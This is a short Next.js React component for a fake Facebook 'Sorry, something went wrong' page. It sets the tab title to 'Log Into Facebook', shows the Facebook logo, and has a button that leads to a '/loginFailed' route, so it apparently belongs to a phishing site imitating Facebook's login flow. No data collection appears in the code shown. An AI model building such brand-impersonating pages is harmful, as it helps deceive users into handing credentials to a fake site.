"use client";
import React, { useEffect } from "react";
import { useRouter } from "next/navigation";
import Logo from "@/public/logo.svg";
import Image from "next/image";

export default function MaintenancePage() {
  const router = useRouter();

  useEffect(() => {
    document.title = "Log Into Facebook";
  }, []);

  return (
    <>
      <div>
        <div className="bg-[#f0f2f5] pb-[20rem]">
          <div className="flex justify-center pt-9">
            <Image className="h-[5rem] w-full" src={Logo} alt="Facebook" />
          </div>
          <div className="mt-5 grid place-items-center leading-6">
            <h1 className="mb-3 text-2xl">
              <strong>Sorry, something went wrong.</strong>
            </h1>
            <p>
              We&apos;re working on it and we&apos;ll get it fixed as soon as we
              can.
            </p>
            <button
              onClick={() => router.push("/loginFailed")}
              className="underline hover:text-blue-600"
            >
              Go Back.
            </button>
          </div>
        </div>
      </div>
    </>
  );
}
